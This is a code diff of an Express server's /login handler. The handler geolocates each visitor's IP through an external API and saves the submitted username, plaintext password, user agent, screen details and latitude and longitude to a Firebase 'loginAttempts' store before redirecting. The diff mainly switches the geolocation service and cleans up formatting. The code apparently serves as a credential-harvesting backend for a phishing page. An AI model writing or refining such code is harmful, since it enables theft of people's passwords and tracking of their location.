@@ -5,7 +5,7 @@ const admin = require("firebase-admin");
 const app = express();
 
 // 🔥 Middleware
-app.set("trust proxy",true);
+app.set("trust proxy", true);
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static("public"));
@@ -35,34 +35,41 @@ app.post("/login", async (req, res) => {
 
   let city = "N/A";
   let country = "N/A";
-  let isp="N/A";
-  let lat="N/A";
-  let lon="N/A";
+  let isp = "N/A";
+  let lat = "N/A";
+  let lon = "N/A";
+
   try {
-    const geoRes = await fetch(`https://ipwho.is/${ip}`);
+    // 🔥 UPDATED API (IMPORTANT CHANGE)
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
     const geoData = await geoRes.json();
 
     console.log("GeoData:", geoData);
 
-    if (geoData.success) {
+    if (geoData.status === "success") {
       city = geoData.city || "N/A";
       country = geoData.country || "N/A";
-      isp=geoData.connection?.isp||"N/A";
-      lat=geoData.latitude||"N/A";
-      lon=geoData.longitude||"N/A";
+      isp = geoData.isp || "N/A";
+      lat = geoData.lat || "N/A";
+      lon = geoData.lon || "N/A";
+    } else {
+      console.log("Geo API failed:", geoData);
     }
+
   } catch (err) {
     console.log("Geo API error:", err);
   }
+
   const ref = db.ref("loginAttempts").push();
-   await ref.set({
+
+  await ref.set({
     time: new Date().toLocaleString(),
-   ip:ip,
-    country:country,
-    city:city,
-    isp:isp,
-    lat:lat,
-    lon:lon,
+    ip: ip,
+    country: country,
+    city: city,
+    isp: isp,
+    lat: lat,
+    lon: lon,
     username: data.username || "N/A",
     password: data.password || "N/A",
     userAgent: data.agent || "N/A",
@@ -71,7 +78,7 @@ app.post("/login", async (req, res) => {
     screen: data.screen || "N/A"
   });
 
-  console.log("🔥 Data received:", data);
+  console.log("🔥 Data stored in Firebase");
 
   res.redirect("/dashboard");
 });
